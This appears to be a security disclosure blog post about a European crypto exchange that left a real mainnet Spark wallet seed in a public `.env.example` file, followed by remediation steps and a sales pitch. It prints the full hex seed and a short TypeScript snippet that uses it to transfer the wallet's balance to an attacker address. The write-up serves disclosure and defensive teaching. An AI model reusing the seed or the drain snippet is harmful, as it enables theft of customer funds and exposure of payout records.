# The Production Wallet Seed Was Sitting in a Public GitHub Repo for Four Months

We didn't need to find a vulnerability. We just read the repository.

In the `.env.example` file — publicly committed to the main branch of a crypto exchange's open-source API repository — there was a 64-character hex string next to the variable `SPARK_WALLET_SEED`. Every other wallet private key in the file used `xxx` as a placeholder. This one had a real value. We copied it, initialized a wallet against the production mainnet using the platform's own SDK, and derived the wallet's address in seconds.

The wallet had been publicly compromised for four months before we found it.

## What We Were Looking At

The platform is a European cryptocurrency exchange that processes real fiat-to-crypto transactions for retail customers. Its backend is open-source on GitHub, which is a legitimate engineering choice — transparency builds trust in financial services. The Spark wallet integration was added in January 2026 as part of a new payout feature: when customers receive certain payouts, the platform sends funds through a Spark wallet it controls. That wallet's seed is the master credential — whoever holds it controls the funds.

## The Finding

The `.env.example` file is supposed to show developers the structure of required configuration without exposing real values. Every team has one. The convention is universal: use `xxx`, use `<your_value_here>`, use empty strings — anything but the real secret. This file had followed that convention correctly for every other wallet across roughly a dozen blockchains:

| Variable | Value in .env.example |
|---|---|
| `ETH_WALLET_PRIVATE_KEY` | `xxx` |
| `BSC_WALLET_PRIVATE_KEY` | `xxx` |
| `SOLANA_WALLET_SEED` | *(empty)* |
| `LIGHTNING_SIGNING_PRIV_KEY` | *(empty)* |
| **`SPARK_WALLET_SEED`** | **`b248869a3d2de286f39052fbdd1e38450551ef37d90b8b2d7515e2a95b6e9625`** |

One real value, surrounded by placeholders.

The seed was introduced in commit `45ad398` — the same commit that added the entire Spark payout pipeline. The pattern is familiar: a developer used the real seed locally to test the integration, the tests passed, the code was committed, and nobody noticed the `.env.example` had been included in the diff with the real value still in it. The seed had been sitting there, publicly, since January 12, 2026.

The `SparkClient` code confirmed this wasn't a development credential. The wallet initialized with `network: 'MAINNET'` — the SDK makes an explicit distinction between mainnet and regtest, and the production code chose mainnet:

```typescript
async initializeWallet() {
  return SparkWallet.initialize({
    mnemonicOrSeed: GetConfig().blockchain.spark.sparkWalletSeed,
    accountNumber: 0,
    options: {
      network: 'MAINNET',   // production network — not a test wallet
    },
  });
}
```

We verified it. The wallet initialized. The address derived. The balance was zero at the time of testing — but that's not what matters. The payout service deposits funds into this wallet on demand, during active customer payout cycles. The seed gives permanent control of whatever funds pass through.

## The Impact

Anyone who cloned the repository, read the file, and knew what a Spark wallet seed looked like had full control of this wallet. That means: view the complete payout transaction history (every customer address and amount), check the current balance, and call `wallet.transfer()` to drain it to any address — all from a laptop, in under two minutes, with no platform access and no authentication. The attack requires four lines of code:

```typescript
const wallet = await SparkWallet.initialize({
  mnemonicOrSeed: 'b248869a3d2de286f39052fbdd1e38450551ef37d90b8b2d7515e2a95b6e9625',
  accountNumber: 0,
  options: { network: 'MAINNET' },
});
await wallet.transfer({ receiverSparkAddress: 'spark1<attacker>', amountSats: balance.balance });
```

The exposure window was four months. There is no way to know whether someone with worse intentions found it first — there would be no trace in the platform's own logs if they accessed the wallet directly through the SDK. The transaction history the attacker can read reveals customer payout addresses and amounts, compounding the privacy exposure even if no funds were moved.

## The Fix

**Immediately:** Rotate the seed. Generate a new Spark wallet with `SparkWallet.create()`, migrate any remaining balance to the new address, and update the production environment variable. Update `.env.example` to use `xxx`.

**Then:** Scrub the git history. Deleting the value from the current file is not enough — it remains in commit `45ad398` and every subsequent commit until a history rewrite. Use `git filter-repo` or BFG Repo Cleaner to remove the value from all historical commits, then force-push.

**Finally:** Audit the wallet's transaction history using the exposed seed before rotating it. `wallet.getTransfers()` shows every historical outbound payout. If any unauthorized transfers occurred during the four-month window, you need to know before you close the door.

## The Pattern

Secrets in `.env.example` files are a well-documented risk, and almost every team has had a close call with it. The problem isn't carelessness — it's that `.env.example` files feel like documentation, not configuration. They don't feel dangerous. They're usually in `.gitignore` exclusion discussions for `.env`, not for `.env.example`.

Run `git log --all --full-history -- '*.env*'` against your repository right now. Look at every commit that touched any environment file. Then run `git grep -i 'private_key\|seed\|secret\|password\|token' -- '*.example'` across your full history. Secret scanning tools like `truffleHog` or `gitleaks` can automate this and integrate into your CI pipeline so it never ships again. Set one up before you close this tab.

---

*If you want to know whether your app has this before an attacker does, we'll scan one endpoint for free — no strings.*

---

**Technical appendix:** CVSS 3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = **9.8 Critical** | CWE-321 (Use of Hard-coded Cryptographic Key)
